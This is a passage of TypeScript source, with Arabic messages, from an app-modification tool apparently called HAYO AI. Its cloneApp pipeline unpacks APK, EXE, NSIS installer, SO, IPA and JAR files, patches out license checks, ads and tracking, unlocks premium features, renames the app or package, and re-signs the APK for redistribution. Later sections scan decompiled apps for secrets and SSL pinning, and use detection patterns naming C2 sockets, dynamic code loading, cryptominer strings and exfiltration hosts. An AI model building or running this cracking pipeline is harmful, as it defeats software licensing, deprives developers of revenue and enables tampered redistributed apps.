              content = JSON.stringify(pkg, null, 2);
            }
          } catch {}
        }
      }

      if (content !== original) {
        fs.writeFileSync(filePath, content, "utf-8");
        mods.push(`✏️ ملف معدّل: ${relPath}`);
      }
    } catch {}
  }
  return mods;
}

async function realRebuildEXE(workDir: string, originalBuffer: Buffer, extracted: ExtractedExe, options: CloneOptions): Promise<{ buffer: Buffer; mods: string[] }> {
  const mods: string[] = [];
  let result = Buffer.from(originalBuffer);

  if (extracted.subType === "nsis" && extracted.innerExe) {
    const innerBuf = fs.readFileSync(extracted.innerExe);
    let patchedInner = Buffer.from(innerBuf);

    if (options.removeAds) {
      const r = binaryPatchRemoveAds(patchedInner);
      patchedInner = r.patched; mods.push(...r.mods);
    }
    if (options.unlockPremium) {
      const r = binaryPatchUnlockPremium(patchedInner);
      patchedInner = r.patched; mods.push(...r.mods);
    }
    if (options.removeTracking) {
      const r = binaryPatchRemoveTracking(patchedInner);
      patchedInner = r.patched; mods.push(...r.mods);
    }
    if (options.removeLicenseCheck) {
      const r = binaryPatchRemoveLicense(patchedInner);
      patchedInner = r.patched; mods.push(...r.mods);
    }
    if (options.changeAppName) {
      const r = binaryPatchChangeAppName(patchedInner, options.changeAppName);
      patchedInner = r.patched; mods.push(...r.mods);
    }

    const innerIsTauri = extracted.innerSubType === "tauri" || extracted.innerSubType === "electron" ||
      extracted.subType === "tauri" || extracted.subType === "electron";
    if (innerIsTauri) {
      const tauriPatch = patchTauriEmbeddedAssets(patchedInner, options);
      patchedInner = tauriPatch.patched;
      mods.push(...tauriPatch.mods);
    }

    mods.push(`✅ تم تعديل الملف الداخلي: ${path.basename(extracted.innerExe)} (${formatBytes(patchedInner.length)})`);

    let patchedOriginal = Buffer.from(originalBuffer);
    let appliedToInstaller = false;
    if (innerBuf.length === patchedInner.length) {
      let diffPositions: Array<{ offset: number; oldByte: number; newByte: number }> = [];
      for (let i = 0; i < innerBuf.length; i++) {
        if (innerBuf[i] !== patchedInner[i]) {
          diffPositions.push({ offset: i, oldByte: innerBuf[i], newByte: patchedInner[i] });
        }
      }
      if (diffPositions.length > 0 && diffPositions.length < 100000) {
        let patchedCount = 0;
        for (const diff of diffPositions) {
          let searchStart = 0;
          while (searchStart < patchedOriginal.length) {
            const matchIdx = originalBuffer.indexOf(innerBuf.slice(Math.max(0, diff.offset - 8), diff.offset + 9), searchStart);
            if (matchIdx === -1) break;
            const targetIdx = matchIdx + Math.min(8, diff.offset);
            if (patchedOriginal[targetIdx] === diff.oldByte) {
              patchedOriginal[targetIdx] = diff.newByte;
              patchedCount++;
              break;
            }
            searchStart = matchIdx + 1;
          }
        }
        if (patchedCount > 0) {
          result = patchedOriginal;
          appliedToInstaller = true;
          mods.push(`✅ تم تطبيق ${patchedCount}/${diffPositions.length} تعديل على ملف الـ installer الأصلي (الحجم الأصلي محفوظ)`);
        }
      }
    }

    if (!appliedToInstaller) {
      const outputZip = new JSZip();
      outputZip.file(path.basename(extracted.innerExe), patchedInner);
      const pluginsDir = path.join(extracted.extractDir, "$PLUGINSDIR");
      if (fs.existsSync(pluginsDir)) {
        const pluginFiles = readDirRecursive(pluginsDir);
        for (const pf of pluginFiles) {
          outputZip.file("$PLUGINSDIR/" + path.basename(pf), fs.readFileSync(pf));
        }
      }
      outputZip.file("HAYO-CLONE-INFO.txt", [
        "=== HAYO AI — Clone Report ===",
        `Original: NSIS installer (${formatBytes(originalBuffer.length)})`,
        `Inner EXE: ${path.basename(extracted.innerExe)} (${formatBytes(patchedInner.length)})`,
        `Patches applied: ${mods.length}`,
        "",
        "Instructions:",
        "1. Extract the inner EXE from this ZIP",
        "2. Run it directly (no installer needed)",
        "3. Or use NSIS to repackage as installer",
        "",
        "Modifications:",
        ...mods,
      ].join("\n"));
      result = await outputZip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
      mods.push(`📦 تم تصدير ZIP يحتوي الملف المعدّل + التعليمات`);
    }
  } else {
    if (options.removeAds) {
      const r = binaryPatchRemoveAds(result);
      result = r.patched; mods.push(...r.mods);
    }
    if (options.unlockPremium) {
      const r = binaryPatchUnlockPremium(result);
      result = r.patched; mods.push(...r.mods);
    }
    if (options.removeTracking) {
      const r = binaryPatchRemoveTracking(result);
      result = r.patched; mods.push(...r.mods);
    }
    if (options.removeLicenseCheck) {
      const r = binaryPatchRemoveLicense(result);
      result = r.patched; mods.push(...r.mods);
    }
    if (options.changeAppName) {
      const r = binaryPatchChangeAppName(result, options.changeAppName);
      result = r.patched; mods.push(...r.mods);
    }

    if (extracted.subType === "tauri" || extracted.subType === "electron") {
      const tauriPatch = patchTauriEmbeddedAssets(result, options);
      result = tauriPatch.patched;
      mods.push(...tauriPatch.mods);
    }
  }

  return { buffer: result, mods };
}

export async function cloneApp(
  fileBuffer: Buffer,
  fileName: string,
  options: CloneOptions
): Promise<{
  success: boolean;
  apkBuffer?: Buffer;
  signed: boolean;
  modifications: string[];
  error?: string;
}> {
  const ext = fileName.split(".").pop()?.toLowerCase();
  const allSupported = ["apk", "exe", "dll", "so", "ipa", "jar", "aar", "dex", "ex4", "ex5", "wasm", "elf"];
  if (!ext || !allSupported.includes(ext)) {
    return { success: false, signed: false, modifications: [], error: `الاستنساخ يدعم: ${allSupported.map(f => f.toUpperCase()).join(", ")}. الملف: .${ext}` };
  }

  const modifications: string[] = [];

  if (ext === "exe" || ext === "dll") {
    const workDir = path.join(os.tmpdir(), `hayo-clone-${Date.now()}`);
    fs.mkdirSync(workDir, { recursive: true });

    try {
      modifications.push(`🔍 نوع الملف: ${ext.toUpperCase()} — ${formatBytes(fileBuffer.length)}`);
      const subType = detectExeSubType(fileBuffer);
      modifications.push(`🔍 نوع فرعي: ${subType.toUpperCase()}`);

      const extracted = await realExtractEXE(fileBuffer, workDir);
      modifications.push(`📂 استخراج: ${extracted.resourceFiles.length} ملف`);

      const resourceMods = patchResourceFiles(extracted.resourceFiles, options);
      modifications.push(...resourceMods);

      const { buffer: finalBuffer, mods: binaryMods } = await realRebuildEXE(workDir, fileBuffer, extracted, options);
      modifications.push(...binaryMods);

      if (binaryMods.length === 0 && resourceMods.length === 0) {
        modifications.push("⚠️ لم يتم العثور على أنماط معروفة للتعديل — يتطلب تحليل يدوي أعمق");
      }

      modifications.push(`📦 الملف النهائي: ${formatBytes(finalBuffer.length)}`);
      try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
      return { success: true, apkBuffer: finalBuffer, signed: false, modifications };
    } catch (err: any) {
      try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
      return { success: false, signed: false, modifications, error: `فشل استنساخ EXE: ${err.message}` };
    }
  }

  if (ext === "apk") {
    const decompResult = await decompileFileForEdit(fileBuffer, fileName);
    if (!decompResult.success || !decompResult.sessionId) {
      return { success: false, signed: false, modifications: [], error: decompResult.error || "فشل التفكيك" };
    }

    const sessionId = decompResult.sessionId;
    const session = editSessions.get(sessionId);
    if (!session) return { success: false, signed: false, modifications: [], error: "فشل إنشاء الجلسة" };

    modifications.push(`🔍 APK — ${formatBytes(fileBuffer.length)}`);

    if (options.removeAds) {
      const adMods = directRemoveAds(session.decompDir);
      modifications.push(...adMods);
    }
    if (options.unlockPremium) {
      const premiumMods = directUnlockPremium(session.decompDir);
      modifications.push(...premiumMods);
    }
    if (options.removeTracking) {
      const trackMods = directRemoveTracking(session.decompDir);
      modifications.push(...trackMods);
    }
    if (options.removeLicenseCheck) {
      const licenseMods = directRemoveLicenseCheck(session.decompDir);
      modifications.push(...licenseMods);
    }
    if (options.changeAppName) {
      const nameMods = directChangeAppName(session.decompDir, options.changeAppName);
      modifications.push(...nameMods);
    }

    if (options.changePackageName) {
      const manifestPath = path.join(session.decompDir, "AndroidManifest.xml");
      if (fs.existsSync(manifestPath)) {
        try {
          let manifest = fs.readFileSync(manifestPath, "utf-8");
          manifest = manifest.replace(/package="[^"]*"/, `package="${options.changePackageName}"`);
          fs.writeFileSync(manifestPath, manifest, "utf-8");
          modifications.push(`📦 اسم الحزمة → "${options.changePackageName}"`);
        } catch {}
      }
    }

    const rebuildResult = await rebuildAPK(sessionId);
    if (!rebuildResult.success) {
      return { success: false, signed: false, modifications, error: rebuildResult.error || "فشل إعادة البناء" };
    }

    let finalBuffer = rebuildResult.apkBuffer!;
    let signed = rebuildResult.signed;

    if (!signed) {
      const signResult = await signAPKBuffer(finalBuffer);
      if (signResult.signed) {
        finalBuffer = signResult.buffer;
        signed = true;
        modifications.push("✅ تم التوقيع بـ uber-apk-signer");
      } else {
        const tmpApk = path.join(os.tmpdir(), `clone-sign-${Date.now()}.apk`);
        fs.writeFileSync(tmpApk, finalBuffer);
        const signedBuffer = await signAPKFile(tmpApk);
        if (signedBuffer) {
          finalBuffer = signedBuffer;
          signed = true;
          modifications.push("✅ تم التوقيع بنجاح");
        } else {
          modifications.push("⚠️ تعذر التوقيع — قد تحتاج توقيع يدوي");
        }
        try { fs.unlinkSync(tmpApk); } catch {}
      }
    } else {
      modifications.push("✅ تم التوقيع أثناء البناء");
    }

    return { success: true, apkBuffer: finalBuffer, signed, modifications };
  }

  if (ext === "so" || ext === "elf") {
    const workDir = path.join(os.tmpdir(), `hayo-clone-${Date.now()}`);
    fs.mkdirSync(workDir, { recursive: true });
    try {
      let result = Buffer.from(fileBuffer);
      modifications.push(`🔍 ${ext.toUpperCase()} — ${formatBytes(fileBuffer.length)}`);

      if (options.removeAds) { const r = binaryPatchRemoveAds(result); result = r.patched; modifications.push(...r.mods); }
      if (options.unlockPremium) { const r = binaryPatchUnlockPremium(result); result = r.patched; modifications.push(...r.mods); }
      if (options.removeTracking) { const r = binaryPatchRemoveTracking(result); result = r.patched; modifications.push(...r.mods); }
      if (options.removeLicenseCheck) { const r = binaryPatchRemoveLicense(result); result = r.patched; modifications.push(...r.mods); }

      modifications.push(`📦 الملف النهائي: ${formatBytes(result.length)}`);
      try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
      return { success: true, apkBuffer: result, signed: false, modifications };
    } catch (err: any) {
      try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
      return { success: false, signed: false, modifications, error: `فشل: ${err.message}` };
    }
  }

  const decompResult = await decompileFileForEdit(fileBuffer, fileName);
  if (!decompResult.success || !decompResult.sessionId) {
    return { success: false, signed: false, modifications: [], error: decompResult.error || "فشل التفكيك" };
  }

  const sessionId = decompResult.sessionId;
  const session = editSessions.get(sessionId);
  if (!session) return { success: false, signed: false, modifications: [], error: "فشل إنشاء الجلسة" };

  modifications.push(`🔍 ${ext.toUpperCase()} — ${formatBytes(fileBuffer.length)}`);

  if (options.removeAds) {
    const adMods = directRemoveAds(session.decompDir);
    modifications.push(...adMods);
  }
  if (options.unlockPremium) {
    const premiumMods = directUnlockPremium(session.decompDir);
    modifications.push(...premiumMods);
  }
  if (options.removeTracking) {
    const trackMods = directRemoveTracking(session.decompDir);
    modifications.push(...trackMods);
  }
  if (options.removeLicenseCheck) {
    const licenseMods = directRemoveLicenseCheck(session.decompDir);
    modifications.push(...licenseMods);
  }
  if (options.changeAppName) {
    const nameMods = directChangeAppName(session.decompDir, options.changeAppName);
    modifications.push(...nameMods);
  }

  try {
    const zip = new JSZip();
    const allFiles = readDirRecursive(session.decompDir);
    for (const filePath of allFiles) {
      const relPath = path.relative(session.decompDir, filePath);
      zip.file(relPath, fs.readFileSync(filePath));
    }

    if (ext === "jar" || ext === "aar") {
      const jarBuffer = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
      modifications.push(`📦 تم إعادة تجميع ${ext.toUpperCase()} بنجاح`);
      return { success: true, apkBuffer: jarBuffer, signed: false, modifications };
    }
    if (ext === "ipa") {
      const ipaBuffer = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
      modifications.push("📦 تم إعادة تجميع IPA — يحتاج إعادة توقيع بشهادة Apple");
      return { success: true, apkBuffer: ipaBuffer, signed: false, modifications };
    }

    const outBuffer = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
    modifications.push(`📦 تم إعادة تجميع ${ext.toUpperCase()}`);
    return { success: true, apkBuffer: outBuffer, signed: false, modifications };
  } catch (err: any) {
    return { success: false, signed: false, modifications, error: `فشل التصدير: ${err.message}` };
  }
}

// ════════════════════════════════════════════════════════════════
// APK Signing Helpers — Multiple methods for maximum compatibility
// ════════════════════════════════════════════════════════════════

async function signAPKBuffer(apkBuffer: Buffer): Promise<{ signed: boolean; buffer: Buffer }> {
  const tmpDir = path.join(os.tmpdir(), `hayo-sign-${Date.now()}`);
  const inputPath = path.join(tmpDir, "input.apk");
  const keystorePath = ensureKeystore();

  try {
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(inputPath, apkBuffer);

    const uberSigner = findApkSigner();
    if (uberSigner) {
      try {
        execSync(
          `java -jar "${uberSigner}" -a "${inputPath}" -o "${tmpDir}" --allowResign --overwrite --ksDebug "${keystorePath}"`,
          { timeout: 300000, stdio: "pipe" }
        );
        const signedFile = fs.readdirSync(tmpDir)
          .filter(f => (f.includes("Signed") || f.includes("signed")) && f.endsWith(".apk"))
          .sort((a, b) => fs.statSync(path.join(tmpDir, b)).size - fs.statSync(path.join(tmpDir, a)).size)[0];
        if (signedFile) {
          const result = fs.readFileSync(path.join(tmpDir, signedFile));
          return { signed: true, buffer: result };
        }
      } catch (e: any) {
        console.warn("[Sign] uber-apk-signer failed:", e.message?.substring(0, 200));
      }
    }

    if (signWithJarsigner(inputPath)) {
      return { signed: true, buffer: fs.readFileSync(inputPath) };
    }

    return { signed: false, buffer: apkBuffer };
  } finally {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  }
}

async function signAPKFile(apkPath: string): Promise<Buffer | null> {
  if (signWithJarsigner(apkPath)) {
    return fs.readFileSync(apkPath);
  }
  return null;
}

// ════════════════════════════════════════════════════════════════
// Intelligence Report — Deep security scan
// ════════════════════════════════════════════════════════════════

export async function generateIntelligenceReport(
  sessionId: string
): Promise<{
  ssl: string[];
  root: string[];
  crypto: string[];
  secrets: string[];
  urls: string[];
  summary: string;
}> {
  const session = editSessions.get(sessionId);
  if (!session) throw new Error("الجلسة غير موجودة");

  const allFiles = readDirRecursive(session.decompDir);
  const findings = { ssl: [] as string[], root: [] as string[], crypto: [] as string[], secrets: [] as string[], urls: [] as string[] };

  const patterns = {
    ssl: [/TrustManager/gi, /X509TrustManager/gi, /ALLOW_ALL_HOSTNAME/gi, /SSLSocketFactory/gi, /certificate.*pin/gi, /okhttp3.*CertificatePinner/gi, /javax\.net\.ssl/gi, /HostnameVerifier/gi, /checkServerTrusted/gi, /NetworkSecurityConfig/gi],
    root: [/su\b/g, /Superuser/gi, /RootBeer/gi, /isRooted/gi, /com\.topjohnwu/gi, /magisk/gi, /busybox/gi, /\/system\/app\/Superuser/g, /isDeviceRooted/gi, /SafetyNet/gi, /PlayIntegrity/gi],
    crypto: [/AES/g, /DES\b/g, /RSA/g, /SHA\-?256/gi, /MD5/gi, /Base64/g, /encrypt/gi, /decrypt/gi, /cipher/gi, /javax\.crypto/gi, /SecretKeySpec/gi, /PBKDF2/gi, /IV.*spec/gi, /GCM/gi, /CBC/gi, /ECB/gi, /Bouncy.*Castle/gi],
    secrets: [/api[_-]?key/gi, /secret[_-]?key/gi, /password/gi, /token/gi, /Bearer\s/g, /auth[_-]?token/gi, /private[_-]?key/gi, /AKIA[0-9A-Z]{16}/g, /AIza[0-9A-Za-z_-]{35}/g, /firebase.*key/gi, /aws.*secret/gi, /jwt[_-]?secret/gi, /SharedPreferences.*put/gi, /getSharedPreferences/gi, /-----BEGIN.*KEY-----/g],
    urls: [/https?:\/\/[^\s"'<>]+/g, /wss?:\/\/[^\s"'<>]+/g, /\/api\/v\d+\/[\w/]+/g, /\.amazonaws\.com/gi, /firebaseio\.com/gi, /\.googleapis\.com/gi],
  };

  for (const filePath of allFiles) {
    const ext = path.extname(filePath).toLowerCase();
    if (![".smali", ".xml", ".json", ".txt", ".properties", ".java", ".kt", ".js", ".html", ".yml", ".yaml"].includes(ext)) continue;

    try {
      const stat = fs.statSync(filePath);
      if (stat.size > 500000) continue;
      const content = fs.readFileSync(filePath, "utf-8");
      const relPath = path.relative(session.decompDir, filePath);

      for (const [category, regexList] of Object.entries(patterns)) {
        for (const regex of regexList) {
          const matches = content.match(regex);
          if (matches) {
            const key = category as keyof typeof findings;
            for (const match of matches.slice(0, 3)) {
              // Get context (surrounding line)
              const idx = content.indexOf(match);
              const lineStart = content.lastIndexOf("\n", idx) + 1;
              const lineEnd = content.indexOf("\n", idx + match.length);
              const line = content.substring(lineStart, lineEnd > -1 ? lineEnd : lineStart + 200).trim();
              findings[key].push(`${relPath}: ${line.substring(0, 150)}`);
            }
          }
        }
      }
    } catch { /* skip */ }
  }

  // Deduplicate
  for (const key of Object.keys(findings) as Array<keyof typeof findings>) {
    findings[key] = [...new Set(findings[key])].slice(0, 50);
  }

  return {
    ...findings,
    summary: `SSL/TLS: ${findings.ssl.length} | Root Detection: ${findings.root.length} | Crypto: ${findings.crypto.length} | Secrets: ${findings.secrets.length} | URLs: ${findings.urls.length}`,
  };
}

// ════════════════════════════════════════════════════════════════
// Regex Search — Search across all files with regex pattern
// ════════════════════════════════════════════════════════════════

export function regexSearchFiles(
  sessionId: string,
  pattern: string,
  category?: string
): Array<{ filePath: string; line: number; match: string; context: string }> {
  const session = editSessions.get(sessionId);
  if (!session) throw new Error("الجلسة غير موجودة");

  // Preset patterns by category
  const presetPatterns: Record<string, string> = {
    ssl: "TrustManager|X509|SSLSocket|ALLOW_ALL|certificate",
    root: "su\\b|Superuser|isRooted|RootBeer|magisk|topjohnwu",
    crypto: "AES|DES\\b|RSA|SHA.?256|MD5|encrypt|decrypt|cipher|Base64",
    secrets: "api.?key|secret.?key|password|token|Bearer|auth.?token|private.?key",
    urls: "https?://[^\\s\"'<>]+",
  };

  const searchPattern = category ? presetPatterns[category] || pattern : pattern;
  let regex: RegExp;
  try {
    regex = new RegExp(searchPattern, "gi");
  } catch {
    throw new Error(`نمط Regex غير صالح: ${searchPattern}`);
  }

  const results: Array<{ filePath: string; line: number; match: string; context: string }> = [];
  const allFiles = readDirRecursive(session.decompDir);

  for (const filePath of allFiles) {
    const ext = path.extname(filePath).toLowerCase();
    if (![".smali", ".xml", ".json", ".txt", ".properties", ".java", ".kt", ".js", ".html", ".yml", ".yaml", ".cfg", ".ini", ".pro"].includes(ext)) continue;

    try {
      const stat = fs.statSync(filePath);
      if (stat.size > 500000) continue;
      const content = fs.readFileSync(filePath, "utf-8");
      const lines = content.split("\n");
      const relPath = path.relative(session.decompDir, filePath);

      for (let i = 0; i < lines.length; i++) {
        const match = lines[i].match(regex);
        if (match) {
          results.push({
            filePath: relPath,
            line: i + 1,
            match: match[0],
            context: lines[i].trim().substring(0, 200),
          });
          if (results.length >= 200) return results;
        }
        // Reset regex lastIndex for global flag
        regex.lastIndex = 0;
      }
    } catch { /* skip */ }
  }

  return results;
}


// ════════════════════════════════════════════════════════════════════
// ADVANCED REVERSE ENGINEERING — HAYO AI v4.0
// Binary analysis, certificate extraction, AI decompilation,
// vulnerability deep scan, malware detection, obfuscation analysis
// Works WITHOUT JADX/APKTool — pure JS + AI
// ════════════════════════════════════════════════════════════════════

// ── Certificate / Signature Analysis ─────────────────────────────
export async function analyzeCertificate(zipBuffer: Buffer): Promise<{
  signed: boolean; signerName: string; algorithm: string; validFrom: string;
  validTo: string; serialNumber: string; fingerprints: { md5: string; sha1: string; sha256: string };
  v1Signature: boolean; v2Signature: boolean; v3Signature: boolean;
}> {
  const JSZip = (await import("jszip")).default;
  const crypto = await import("crypto");
  const zip = await JSZip.loadAsync(zipBuffer);

  let signed = false, signerName = "", algorithm = "", validFrom = "", validTo = "";
  let serialNumber = "", v1 = false, v2 = false, v3 = false;
  let certDer: Buffer | null = null;

  // V1: META-INF/*.RSA or *.DSA
  for (const [name, entry] of Object.entries(zip.files)) {
    if (/META-INF\/.*\.(RSA|DSA|EC)$/i.test(name)) {
      v1 = true; signed = true;
      const buf = Buffer.from(await entry.async("uint8array"));
      certDer = buf;
      // Parse basic PKCS#7/X.509 info from DER
      const hex = buf.toString("hex");
      // Extract CN from subject
      const cnMatch = hex.match(/0603550403..(.{2,60})/);
      if (cnMatch) { try { signerName = Buffer.from(cnMatch[1], "hex").toString("utf-8").replace(/[^\x20-\x7E\u0600-\u06FF]/g, ""); } catch {} }
      // Detect algorithm
      if (hex.includes("2a864886f70d010105")) algorithm = "SHA1withRSA";
      else if (hex.includes("2a864886f70d01010b")) algorithm = "SHA256withRSA";
      else if (hex.includes("2a864886f70d01010d")) algorithm = "SHA512withRSA";
      else if (hex.includes("2a8648ce3d040302")) algorithm = "SHA256withECDSA";
      else algorithm = "Unknown";
    }
    if (/META-INF\/.*\.SF$/i.test(name)) v1 = true;
  }

  // V2/V3: APK Signing Block (magic bytes at end of ZIP)
  const apkHex = zipBuffer.slice(-8192).toString("hex");
  if (apkHex.includes("41504b205369672042")) v2 = true; // "APK Sig B"
  if (v2 && apkHex.includes("f05281e811")) v3 = true;

  // Fingerprints
  const fingerprints = {
    md5: certDer ? crypto.createHash("md5").update(certDer).digest("hex").match(/.{2}/g)!.join(":").toUpperCase() : "",
    sha1: certDer ? crypto.createHash("sha1").update(certDer).digest("hex").match(/.{2}/g)!.join(":").toUpperCase() : "",
    sha256: certDer ? crypto.createHash("sha256").update(certDer).digest("hex").match(/.{2}/g)!.join(":").toUpperCase() : "",
  };

  return { signed, signerName, algorithm, validFrom, validTo, serialNumber, fingerprints, v1Signature: v1, v2Signature: v2, v3Signature: v3 };
}

// ── Permission Risk Scoring ──────────────────────────────────────
export function analyzePermissionRisk(permissions: string[]): {
  score: number; level: string; dangerous: string[]; normal: string[];
  details: Array<{ perm: string; risk: string; reason: string }>;
} {
  const RISK_MAP: Record<string, { risk: "critical" | "high" | "medium" | "low"; reason: string }> = {
    "CAMERA": { risk: "high", reason: "الوصول للكاميرا — يمكن التقاط صور/فيديو بدون علم المستخدم" },
    "RECORD_AUDIO": { risk: "critical", reason: "تسجيل الصوت — خطر تنصت" },
    "READ_SMS": { risk: "critical", reason: "قراءة الرسائل — سرقة رموز التحقق OTP" },
    "SEND_SMS": { risk: "critical", reason: "إرسال رسائل — اشتراكات مدفوعة بدون علم" },
    "READ_CONTACTS": { risk: "high", reason: "الوصول لجهات الاتصال — جمع بيانات شخصية" },
    "ACCESS_FINE_LOCATION": { risk: "high", reason: "الموقع الدقيق — تتبع المستخدم" },
    "ACCESS_COARSE_LOCATION": { risk: "medium", reason: "الموقع التقريبي" },
    "READ_PHONE_STATE": { risk: "high", reason: "معلومات الهاتف — IMEI وأرقام" },
    "CALL_PHONE": { risk: "high", reason: "إجراء مكالمات بدون إذن" },
    "READ_EXTERNAL_STORAGE": { risk: "medium", reason: "قراءة الملفات الخارجية" },
    "WRITE_EXTERNAL_STORAGE": { risk: "medium", reason: "كتابة ملفات — حقن برمجيات" },
    "INTERNET": { risk: "low", reason: "اتصال بالإنترنت — طبيعي لأغلب التطبيقات" },
    "SYSTEM_ALERT_WINDOW": { risk: "high", reason: "نوافذ فوق التطبيقات — overlay attacks" },
    "RECEIVE_BOOT_COMPLETED": { risk: "medium", reason: "يعمل عند تشغيل الجهاز تلقائياً" },
    "REQUEST_INSTALL_PACKAGES": { risk: "critical", reason: "تثبيت تطبيقات — خطر تثبيت برمجيات خبيثة" },
    "BIND_DEVICE_ADMIN": { risk: "critical", reason: "صلاحيات إدارة الجهاز — يمكنه قفل/مسح الجهاز" },
    "USE_BIOMETRIC": { risk: "high", reason: "الوصول لبصمة الإصبع/الوجه" },
    "BIND_ACCESSIBILITY_SERVICE": { risk: "critical", reason: "خدمة إمكانية الوصول — يمكنه قراءة كل شيء على الشاشة" },
    "READ_CALL_LOG": { risk: "high", reason: "قراءة سجل المكالمات" },
    "WRITE_SETTINGS": { risk: "high", reason: "تعديل إعدادات النظام" },
  };

  const dangerous: string[] = [];
  const normal: string[] = [];
  const details: Array<{ perm: string; risk: string; reason: string }> = [];
  let totalRisk = 0;

  for (const perm of permissions) {
    const shortPerm = perm.replace("android.permission.", "");
    const info = RISK_MAP[shortPerm];
    if (info) {
      const riskScore = info.risk === "critical" ? 25 : info.risk === "high" ? 15 : info.risk === "medium" ? 8 : 2;
      totalRisk += riskScore;
      dangerous.push(shortPerm);
      details.push({ perm: shortPerm, risk: info.risk, reason: info.reason });
    } else {
      normal.push(shortPerm);
    }
  }

  const score = Math.min(100, totalRisk);
  const level = score >= 75 ? "خطير جداً 🔴" : score >= 50 ? "خطير 🟠" : score >= 25 ? "متوسط 🟡" : "آمن 🟢";

  return { score, level, dangerous, normal, details };
}

// ── Network Endpoint & URL Extraction ────────────────────────────
export function extractNetworkEndpoints(files: DecompiledFile[]): {
  urls: string[]; ips: string[]; domains: string[]; apiEndpoints: string[];
  suspiciousUrls: string[]; firebaseUrls: string[]; awsUrls: string[];
} {
  const urls = new Set<string>();
  const ips = new Set<string>();
  const domains = new Set<string>();
  const apiEndpoints = new Set<string>();
  const suspiciousUrls = new Set<string>();
  const firebaseUrls = new Set<string>();
  const awsUrls = new Set<string>();

  const urlRegex = /https?:\/\/[^\s"'<>\\)}\]]+/g;
  const ipRegex = /\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g;
  const domainRegex = /(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}/gi;

  for (const file of files) {
    if (!file.content) continue;
    const text = file.content;

    for (const m of text.matchAll(urlRegex)) {
      const url = m[0];
      urls.add(url);
      if (/\/api\//i.test(url)) apiEndpoints.add(url);
      if (/firebase/i.test(url)) firebaseUrls.add(url);
      if (/amazonaws|aws/i.test(url)) awsUrls.add(url);
      if (/pastebin|ngrok|duckdns|no-ip|ddns|telegram\.org\/bot/i.test(url)) suspiciousUrls.add(url);
    }
    for (const m of text.matchAll(ipRegex)) {
      const ip = m[1];
      if (!ip.startsWith("127.") && !ip.startsWith("0.") && ip !== "255.255.255.255") ips.add(ip);
    }
  }

  return {
    urls: [...urls], ips: [...ips], domains: [...domains],
    apiEndpoints: [...apiEndpoints], suspiciousUrls: [...suspiciousUrls],
    firebaseUrls: [...firebaseUrls], awsUrls: [...awsUrls],
  };
}

// ── Obfuscation Detection ────────────────────────────────────────
export function detectObfuscation(files: DecompiledFile[]): {
  isObfuscated: boolean; score: number; techniques: string[];
  obfuscatorGuess: string; evidence: string[];
} {
  let obfScore = 0;
  const techniques: string[] = [];
  const evidence: string[] = [];

  let shortNames = 0, totalNames = 0, stringEncrypt = 0, controlFlow = 0;

  for (const file of files) {
    if (!file.content || file.isBinary) continue;
    const text = file.content;

    // Single-letter class/method names (a.class, b.class, a(), b())
    const shortMatches = text.match(/\b[a-z]\b\s*[.({]/g);
    if (shortMatches) { shortNames += shortMatches.length; }

    // String encryption patterns
    if (/String\.valueOf\(.*\^\s*\d+/g.test(text)) { stringEncrypt++; }
    if (/new String\(.*Base64/g.test(text)) { stringEncrypt++; }
    if (/decrypt|cipher|AES|DES|RC4/gi.test(text) && /string/gi.test(text)) { stringEncrypt++; }

    // Control flow flattening (switch with many cases in sequence)
    const switchMatches = text.match(/case \d+:/g);
    if (switchMatches && switchMatches.length > 20) { controlFlow++; }

    totalNames++;
  }

  if (shortNames > 50) { obfScore += 30; techniques.push("تسمية قصيرة (Name Shortening)"); evidence.push(`${shortNames} اسم من حرف واحد`); }
  if (stringEncrypt > 3) { obfScore += 25; techniques.push("تشفير النصوص (String Encryption)"); evidence.push(`${stringEncrypt} نمط تشفير`); }
  if (controlFlow > 2) { obfScore += 20; techniques.push("تسطيح التحكم (Control Flow Flattening)"); evidence.push(`${controlFlow} switch مشبوه`); }

  let obfuscatorGuess = "غير معروف";
  if (obfScore >= 50) {
    if (stringEncrypt > 5) obfuscatorGuess = "DexGuard أو DashO";
    else if (shortNames > 100) obfuscatorGuess = "ProGuard / R8";
    else obfuscatorGuess = "ProGuard أو أداة مخصصة";
  }

  return {
    isObfuscated: obfScore >= 30,
    score: Math.min(100, obfScore),
    techniques,
    obfuscatorGuess,
    evidence,
  };
}

// ── Malware Pattern Detection ────────────────────────────────────
export function detectMalwarePatterns(files: DecompiledFile[], permissions: string[]): {
  score: number; level: string; indicators: Array<{ type: string; severity: string; description: string; evidence: string }>;
} {
  const indicators: Array<{ type: string; severity: string; description: string; evidence: string }> = [];

  for (const file of files) {
    if (!file.content) continue;
    const text = file.content;
    const fname = file.path;

    // C2 communication patterns
    if (/socket\s*\(|ServerSocket|DatagramSocket/g.test(text)) {
      indicators.push({ type: "C2", severity: "high", description: "اتصال Socket مباشر — قد يكون C2", evidence: fname });
    }

    // Dynamic code loading
    if (/DexClassLoader|PathClassLoader|loadClass|defineClass/g.test(text)) {
      indicators.push({ type: "Dynamic Loading", severity: "critical", description: "تحميل كود ديناميكي — يمكن تحميل malware بعد التثبيت", evidence: fname });
    }

    // Reflection abuse
    if (/Method\.invoke|getMethod\(|getDeclaredMethod/g.test(text) && /setAccessible\(true\)/g.test(text)) {
      indicators.push({ type: "Reflection", severity: "high", description: "استخدام Reflection مع setAccessible — تجاوز حماية", evidence: fname });
    }

    // Root detection bypass
    if (/su\b|\/system\/xbin|Superuser|magisk|rootcloak/gi.test(text)) {
      indicators.push({ type: "Root", severity: "medium", description: "فحص/تجاوز Root — قد يكون مشروعاً أو خبيثاً", evidence: fname });
    }

    // Crypto mining
    if (/coinhive|cryptonight|monero.*mine|stratum\+tcp/gi.test(text)) {
      indicators.push({ type: "Cryptominer", severity: "critical", description: "تعدين عملات رقمية مخفي!", evidence: fname });
    }

    // Data exfiltration
